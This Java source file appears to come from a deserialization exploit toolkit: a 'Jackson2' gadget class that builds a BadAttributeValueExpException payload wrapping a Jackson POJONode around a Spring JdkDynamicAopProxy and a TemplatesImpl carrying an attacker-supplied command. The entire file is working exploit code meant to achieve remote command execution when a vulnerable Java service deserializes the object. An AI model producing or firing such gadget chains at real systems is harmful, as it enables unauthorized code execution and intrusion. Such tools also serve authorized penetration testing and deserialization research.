package org.gadget;

import org.gadget.inter.Gadget;
import com.fasterxml.jackson.databind.node.POJONode;
import javassist.*;
import org.springframework.aop.framework.AdvisedSupport;
import org.util.TemplateUtils;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.lang.reflect.*;

public class Jackson2 implements Gadget {
    @Override
    public Object getObject(String command,String path) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");
        ctClass0.removeMethod(writeReplace);
        ctClass0.toClass();
//        利用 JdkDynamicAopProxy 进行封装使其稳定触发
        Class<?> clazz = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
        Constructor<?> cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
        cons.setAccessible(true);
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(TemplateUtils.getTemplate(command,path));
        InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);
        Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler);
        POJONode jsonNodes = new POJONode(proxyObj);

        BadAttributeValueExpException exp = new BadAttributeValueExpException(null);
        Field val = exp.getClass().getDeclaredField("val");
        val.setAccessible(true);
        val.set(exp,jsonNodes);
        return exp;
    }
}
